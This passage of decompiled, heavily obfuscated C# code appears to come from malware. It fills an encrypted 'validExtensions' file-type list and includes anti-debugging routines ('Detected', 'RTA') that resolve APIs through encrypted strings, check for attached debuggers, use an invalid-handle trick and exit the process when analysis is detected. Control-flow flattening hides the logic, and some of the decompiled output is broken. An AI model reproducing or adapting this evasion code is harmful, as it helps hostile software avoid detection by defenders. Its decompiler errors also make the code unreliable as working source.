		array[Convert.ToInt32(109.0 + Math.Abs(109.0))] = _003CModule_003E.SERT("簸籽米籯", Convert.ToInt32(1738993476.980093 - Math.Sqrt(869481995.0)));
		array[Convert.ToInt32(219.0)] = _003CModule_003E.SERT("䞮䟶䟯䟢", Convert.ToInt32(512435136.0 + Math.Truncate(512435136.0)));
		array[Convert.ToInt32(330.0 - Math.Abs(110.0))] = _003CModule_003E.SERT("릢맩맼맿맼", Convert.ToInt32(2002434443.0 + Math.Tanh(1001217222.0)));
		array[Convert.ToInt32(220.0 + Math.Tanh(110.5))] = _003CModule_003E.SERT("鐕鑟鑘鐈", Convert.ToInt32(2088014907.0));
		array[Convert.ToInt32(221.1354485513894 - Math.Sin(111.0))] = _003CModule_003E.SERT("㲳㳴㳻㳻", Convert.ToInt32(742341789.8391879 + Math.Cos(371170894.5)));
		array[Convert.ToInt32(223.02653608715787 + Math.Cos(111.5))] = _003CModule_003E.SERT("㝞㜟㜞㜕㜀㜛㜗", Convert.ToInt32(792016751.7013206 + Math.Tan(396008376.0)));
		array[Convert.ToInt32(112.0 + Math.Floor(112.0))] = _003CModule_003E.SERT("떒뗓뗒뗙뗈뗓뗟떎", Convert.ToInt32(1015592379.0 + Math.Tanh(507796190.0)));
		array[Convert.ToInt32(225.68023235825913 + Math.Tan(112.5))] = _003CModule_003E.SERT("蔳蕲蕭蕩", Convert.ToInt32(1838777620.0365007 + Math.Log10(919388814.5)));
		array[Convert.ToInt32(226.0)] = _003CModule_003E.SERT("⥖⤈⥏⤚", Convert.ToInt32(359218740.0 - Math.Floor(119739580.0)));
		array[Convert.ToInt32(227.92002013195088 - Math.Cos(113.5))] = _003CModule_003E.SERT("ꔊꕔꕅꕉ", Convert.ToInt32(79340837.0 - Math.Tanh(39670418.0)));
		array[Convert.ToInt32(114.0 + Math.Abs(114.0))] = _003CModule_003E.SERT("孌嬐孑嬆", Convert.ToInt32(1559649122.0));
		validExtensions = array;
		random = new Random();
	}

	[DllImport("kernel32.dll")]
	internal static extern int CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32.dll")]
	internal static extern IntPtr OpenProcess(uint uint_0, int int_0, uint uint_1);

	[DllImport("kernel32.dll")]
	internal static extern uint GetCurrentProcessId();

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	internal static extern GetProcA GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
	internal static extern GetProcA2 GetProcAddress_1(IntPtr intptr_0, string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
	internal static extern GetProcA3 GetProcAddress_3(IntPtr intptr_0, string string_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern int GetClassName(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_0);

	internal unsafe static string SplitMenuItem(IntPtr intptr_0)
	{
		StringBuilder stringBuilder = new StringBuilder(Convert.ToInt32(390.0 - Math.Abs(130.0)));
		while (true)
		{
			int num = Convert.ToInt32(3.0);
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ Convert.ToInt32(1029001589.0 + Math.Truncate(1029001588.5)))) % (uint)Convert.ToInt32(3.0))
				{
				case 1u:
					goto IL_002b;
				case 0u:
					break;
				default:
					return stringBuilder.ToString();
				}
				break;
				IL_002b:
				GetClassName(intptr_0, stringBuilder, stringBuilder.Capacity);
				uint num3 = num2;
				uint[] array = new uint[Convert.ToInt32(-11.101419947171719 + Math.Tan(1.5))];
				array[-4 + sizeof(float)] = (uint)Convert.ToInt32(141.0 + Math.Truncate(140.5));
				array[-3 + sizeof(float)] = (uint)Convert.ToInt32(578.9996482558795 - Math.Cos(289.0)) - array[-4 + sizeof(float)];
				array[Convert.ToInt32(2.0)] = (uint)(Convert.ToInt32(454.03503001705735 + Math.Sin(227.5)) + (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
				uint num4 = (uint)((int)num3 / (int)array[Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0))]);
				num = (int)num4 - Convert.ToInt32(4369431.132028259 + Math.Cos(2184715.5));
			}
		}
	}

	private unsafe static void RTA()
	{
		if (!Detected())
		{
			return;
		}
		while (true)
		{
			int num = Convert.ToInt32(3.9051482536448665 - Math.Tanh(1.5));
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ Convert.ToInt32(2058003186.0124161 - Math.Log10(1029001588.5)))) % (uint)Convert.ToInt32(2.929262798332297 + Math.Cos(1.5)))
				{
				case 1u:
					goto IL_000f;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000f:
				Environment.Exit(-4 + sizeof(float));
				uint num3 = num2;
				uint[] array = new uint[Convert.ToInt32(3.3068528194400546 + Math.Log(2.0))];
				array[-4 + sizeof(float)] = (uint)Convert.ToInt32(263.8636808811396 - Math.Log(129.5));
				array[-3 + sizeof(float)] = (uint)Convert.ToInt32(225.0 - Math.Abs(75.0)) + array[-4 + sizeof(float)];
				array[(578623971 + sizeof(float)) ^ (578623969 + sizeof(float))] = (uint)(Convert.ToInt32(853.6864536713446 + Math.Sin(426.5)) - (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
				array[Convert.ToInt32(3.9974949866040546 - Math.Sin(1.5))] = (uint)(Convert.ToInt32(-75.0) + (int)array[Convert.ToInt32(2.5403023058681398 - Math.Cos(1.0))] + (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
				uint num4 = (uint)((int)num3 / (int)array[Convert.ToInt32(3.0)]);
				num = (int)num4 - Convert.ToInt32(7915394.2536159195 - Math.Sin(3957697.0));
			}
		}
	}

	internal unsafe static bool Detected()
	{
		//IL_0b31: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b32: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b37: Expected I4, but got Unknown
		//IL_0b41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b53: Expected I4, but got Unknown
		//IL_0dda: Incompatible stack heights: 0 vs 1
		//IL_0deb: Incompatible stack heights: 0 vs 1
		try
		{
			IntPtr intptr_ = LoadLibrary(_003CModule_003E.SERT("⽭⽣⽴⽨⽣⽪⼵⼴⼨⽢⽪⽪", Convert.ToInt32(1735077658.5811708 - Math.Log(867538819.0))));
			IntPtr intPtr = default(IntPtr);
			bool result = default(bool);
			GetProcA procAddress = default(GetProcA);
			int int_ = default(int);
			while (true)
			{
				IL_0665:
				int num = Convert.ToInt32(10.0);
				while (true)
				{
					int num20;
					uint num2;
					switch ((num2 = (uint)(num ^ Convert.ToInt32(681047458.0))) % (uint)Convert.ToInt32(13.345207879911715 - Math.Sqrt(5.5)))
					{
					case 10u:
						intPtr = OpenProcess((uint)Convert.ToInt32(1023.0031666091518 - Math.Cos(512.0)), -4 + sizeof(float), GetCurrentProcessId());
						num = -4 + sizeof(float);
						continue;
					case 9u:
					{
						int num27;
						int num28;
						if (!Debugger.IsAttached)
						{
							num27 = Convert.ToInt32(534568.0);
							num28 = num27;
						}
						else
						{
							num27 = Convert.ToInt32(534546.0 + Math.Tanh(267273.5));
							num28 = num27;
						}
						num = num27 ^ ((int)num2 / Convert.ToInt32(1267.543230344428 + Math.Log(637.0)));
						continue;
					}
					case 8u:
					{
						result = (byte)(-3 + sizeof(float)) != 0;
						uint num25 = num2;
						uint[] array = new uint[Convert.ToInt32(4.252977702761339 - Math.Tan(2.5))];
						array[-4 + sizeof(float)] = (uint)Convert.ToInt32(199.51399138488893 - Math.Cos(99.5));
						array[-3 + sizeof(float)] = (uint)Convert.ToInt32(289.0) + array[-4 + sizeof(float)];
						array[Convert.ToInt32(1.0 + Math.Truncate(1.0))] = (uint)(((-1150188932 + sizeof(float)) ^ (1150188542 + sizeof(float))) + (int)array[-3 + sizeof(float)]) + array[-4 + sizeof(float)];
						array[Convert.ToInt32(3.0)] = (uint)(Convert.ToInt32(-111.0) - (int)array[Convert.ToInt32(1.0 + Math.Sqrt(1.0))] + (int)array[-3 + sizeof(float)]) + array[-4 + sizeof(float)];
						array[Convert.ToInt32(6.0 - Math.Truncate(2.0))] = (uint)(Convert.ToInt32(170.0) - (int)array[Convert.ToInt32(3.0)] + (int)array[Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0))] + (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
						uint num26 = (uint)((int)num25 / (int)array[Convert.ToInt32(6.0 - Math.Round(2.0))]);
						num = (int)num26 - Convert.ToInt32(1381445.4454840198 - Math.Log(690716.0));
						continue;
					}
					case 7u:
						num20 = (((uint)procAddress() > (uint)(-4 + sizeof(float))) ? 1 : 0);
						goto IL_031d;
					case 5u:
						procAddress = GetProcAddress(intptr_, _003CModule_003E.SERT("蠍蠷蠀蠡蠦蠱蠣蠣蠡蠶蠔蠶蠡蠷蠡蠪蠰", Convert.ToInt32(630949956.0)));
						num = Convert.ToInt32(0.4425922753450977 + Math.Tan(1.0));
						continue;
					case 1u:
						if (procAddress != null)
						{
							uint num23 = num2;
							uint[] array = new uint[Convert.ToInt32(3.0)];
							array[-4 + sizeof(float)] = (uint)Convert.ToInt32(432.0);
							array[-3 + sizeof(float)] = (uint)Convert.ToInt32(371.0 + Math.Floor(371.0)) - array[-4 + sizeof(float)];
							array[(557547760 + sizeof(float)) ^ (557547762 + sizeof(float))] = (uint)(((2117697114 + sizeof(float)) ^ (2117697449 + sizeof(float))) + (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
							uint num24 = (uint)((int)num23 / (int)array[Convert.ToInt32(1.0 + Math.Abs(1.0))]);
							num = (int)num24 - Convert.ToInt32(1806486.0 + Math.Tanh(903243.5));
							continue;
						}
						num20 = -4 + sizeof(float);
						goto IL_031d;
					case 0u:
					{
						result = (byte)(-3 + sizeof(float)) != 0;
						uint num21 = num2;
						uint[] array = new uint[Convert.ToInt32(3.9051482536448665 - Math.Tanh(1.5))];
						array[-4 + sizeof(float)] = (uint)Convert.ToInt32(194.0);
						array[-3 + sizeof(float)] = (uint)Convert.ToInt32(-59.0) + array[-4 + sizeof(float)];
						array[Convert.ToInt32(1.2384058440442351 + Math.Tanh(1.0))] = (uint)(Convert.ToInt32(266.0 + Math.Round(266.0)) - (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
						uint num22 = (uint)((int)num21 / (int)array[Convert.ToInt32(3.0 - Math.Ceiling(1.0))]);
						num = (int)num22 - Convert.ToInt32(1677456.0 + Math.Round(1677456.0));
						continue;
					}
					case 6u:
						break;
					default:
					{
						if (intPtr != IntPtr.Zero)
						{
							try
							{
								GetProcA2 procAddress_ = GetProcAddress_1(intptr_, _003CModule_003E.SERT("죽죖죛죝죕죬죛죓죑죊죛죺죛죜죋죙죙죛죌죮죌죛죍죛죐죊", Convert.ToInt32(863815889.883723 - Math.Log(431907935.0))));
								while (true)
								{
									IL_0acf:
									int num3 = -3 + sizeof(float);
									while (true)
									{
										switch ((num2 = (uint)(num3 ^ Convert.ToInt32(681047438.3540046 + Math.Log(340523729.0)))) % (uint)Convert.ToInt32(7.346356379136388 - Math.Cos(4.0)))
										{
										case 5u:
										{
											int num12;
											int num13;
											if ((uint)int_ <= (uint)(-4 + sizeof(float)))
											{
												num12 = Convert.ToInt32(343096.0);
												num13 = num12;
											}
											else
											{
												num12 = (259188289 + sizeof(float)) ^ (259512954 + sizeof(float));
												num13 = num12;
											}
											num3 = num12 ^ ((int)num2 / Convert.ToInt32(2978.0 - Math.Ceiling(992.5)));
											continue;
										}
										case 4u:
										{
											int num10;
											int num11;
											if ((uint)procAddress_(intPtr, ref int_) > (uint)(-4 + sizeof(float)))
											{
												num10 = Convert.ToInt32(838739.0 - Math.Round(279579.5));
												num11 = num10;
											}
											else
											{
												num10 = Convert.ToInt32(558623.2505319151 + Math.Sqrt(279576.0));
												num11 = num10;
											}
											num3 = num10 ^ ((int)num2 / Convert.ToInt32(1217.0 + Math.Tanh(609.0)));
											continue;
										}
										case 3u:
										{
											int num8;
											int num9;
											if (procAddress_ == null)
											{
												num8 = Convert.ToInt32(202451.0 + Math.Round(202451.5));
												num9 = num8;
											}
											else
											{
												num8 = Convert.ToInt32(404901.0);
												num9 = num8;
											}
											num3 = num8 ^ ((int)num2 / Convert.ToInt32(2523.0 - Math.Round(841.0)));
											continue;
										}
										case 1u:
										{
											result = (byte)(-3 + sizeof(float)) != 0;
											uint num6 = num2;
											uint[] array = new uint[Convert.ToInt32(-11.101419947171719 + Math.Tan(1.5))];
											array[-4 + sizeof(float)] = (uint)Convert.ToInt32(398.0 - Math.Tanh(198.5));
											array[-3 + sizeof(float)] = (uint)Convert.ToInt32(-266.0) + array[-4 + sizeof(float)];
											array[Convert.ToInt32(2.0 - Math.Log(1.0))] = (uint)(Convert.ToInt32(-246.0) + (int)array[-3 + sizeof(float)]) + array[-4 + sizeof(float)];
											uint num7 = (uint)((int)num6 / (int)array[Convert.ToInt32(3.0 - Math.Sqrt(1.0))]);
											num3 = (int)num7 - Convert.ToInt32(1207528.0 + Math.Truncate(1207528.0));
											continue;
										}
										case 0u:
										{
											int_ = -4 + sizeof(float);
											uint num4 = num2;
											uint[] array = new uint[Convert.ToInt32(3.0)];
											array[-4 + sizeof(float)] = (uint)Convert.ToInt32(169.0 + Math.Floor(168.5));
											array[-3 + sizeof(float)] = (uint)Convert.ToInt32(1110.0 - Math.Truncate(370.0)) - array[-4 + sizeof(float)];
											array[Convert.ToInt32(2.0)] = (uint)(((1601692205 + sizeof(float)) ^ (1601692577 + sizeof(float))) - (int)array[-3 + sizeof(float)]) + array[-4 + sizeof(float)];
											uint num5 = (uint)((int)num4 / (int)array[Convert.ToInt32(1.0 + Math.Round(1.0))]);
											num3 = (int)num5 - Convert.ToInt32(2014927.0);
											continue;
										}
										default:
											goto end_IL_0a67;
										case 6u:
											break;
										case 2u:
											goto end_IL_0a67;
										case 7u:
											return result;
										}
										goto IL_0acf;
										continue;
										end_IL_0a67:
										break;
									}
									break;
								}
							}
							finally
							{
								CloseHandle(intPtr);
							}
						}
						bool flag = (byte)(-4 + sizeof(float)) != 0;
						try
						{
							CloseHandle(new IntPtr(Convert.ToInt32(305419896.0)));
						}
						catch
						{
							while (true)
							{
								IL_0ddf:
								_ = -4 + sizeof(float);
								while (true)
								{
									int num14 = Convert.ToInt32(681047458.0);
									_003F val = /*Error near IL_0b32: Stack underflow*/^ num14;
									num2 = (uint)(int)val;
									switch (val % Convert.ToInt32(3.0))
									{
									default:
										goto end_IL_0b23;
									case 1:
									{
										flag = (byte)(-3 + sizeof(float)) != 0;
										uint num15 = num2;
										uint[] array = new uint[Convert.ToInt32(3.41886116991581 + Math.Sqrt(2.5))];
										array[-4 + sizeof(float)] = (uint)((532335985 + sizeof(float)) ^ (532335693 + sizeof(float)));
										array[-3 + sizeof(float)] = (uint)Convert.ToInt32(381.0 + Math.Round(381.5)) - array[-4 + sizeof(float)];
										array[Convert.ToInt32(0.4425922753450977 + Math.Tan(1.0))] = (uint)(Convert.ToInt32(1540.0 - Math.Truncate(513.5)) - (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
										array[Convert.ToInt32(1.775255128608411 + Math.Sqrt(1.5))] = (uint)(Convert.ToInt32(466.0 + Math.Floor(466.0)) + (int)array[(1330931378 + sizeof(float)) ^ (1330931376 + sizeof(float))] - (int)array[-3 + sizeof(float)]) - array[-4 + sizeof(float)];
										array[Convert.ToInt32(1.8149601367384811 - Math.Tan(2.0))] = (uint)(((-1960160680 + sizeof(float)) ^ (1960160448 + sizeof(float))) + (int)array[Convert.ToInt32(17.10141994717172 - Math.Tan(1.5))] + (int)array[Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0))] - (int)array[-3 + sizeof(float)]) + array[-4 + sizeof(float)];
										uint num16 = (uint)((int)num15 / (int)array[Convert.ToInt32(5.414213562373095 - Math.Sqrt(2.0))]);
										_ = (int)num16 - Convert.ToInt32(4308954.936138991 + Math.Sqrt(2155211.5));
										continue;
									}
									case 2:
										break;
									case 0:
										goto end_IL_0b23;
									}
									goto IL_0ddf;
									continue;
									end_IL_0b23:
									break;
								}
								break;
							}
						}
						if (!flag)
						{
							goto end_IL_0600;
						}
						while (true)
						{
							IL_0f7b:
							int num17 = -3 + sizeof(float);
							while (true)
							{
								switch ((num2 = (uint)(num17 ^ Convert.ToInt32(681047438.3540046 + Math.Log(340523729.0)))) % (uint)Convert.ToInt32(3.3068528194400546 + Math.Log(2.0)))
								{
								case 3u:
									goto IL_0e00;
								default:
									goto end_IL_0f23;
								case 2u:
									break;
								case 1u:
									goto end_IL_0f23;
								case 0u:
									return result;
								}
								goto IL_0f7b;
								IL_0e00:
								result = (byte)(-3 + sizeof(float)) != 0;
								uint num18 = num2;
								uint[] array = new uint[Convert.ToInt32(3.0)];
								array[-4 + sizeof(float)] = (uint)Convert.ToInt32(308.16552506059645 - Math.Sqrt(148.0));
								array[-3 + sizeof(float)] = (uint)Convert.ToInt32(-59.0) + array[-4 + sizeof(float)];
								array[Convert.ToInt32(1.4596976941318602 + Math.Cos(1.0))] = (uint)(Convert.ToInt32(-298.0) + (int)array[-3 + sizeof(float)]) + array[-4 + sizeof(float)];
								uint num19 = (uint)((int)num18 / (int)array[Convert.ToInt32(1.0 + Math.Abs(1.0))]);
								num17 = (int)num19 - Convert.ToInt32(4347108.0 - Math.Truncate(1449036.0));
								continue;
								end_IL_0f23:
								break;
							}
							break;
						}
						goto end_IL_0600;
					}
					case 2u:
						return result;
					case 4u:
						{
							return result;
						}
						IL_031d:
						if (num20 != 0)
						{
							num = Convert.ToInt32(4.401527855896044 + Math.Sin(2.5));
							continue;
						}
						goto case 10u;
					}
					goto IL_0665;
					continue;
					end_IL_0600:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		return (byte)(-4 + sizeof(float)) != 0;
	}
}
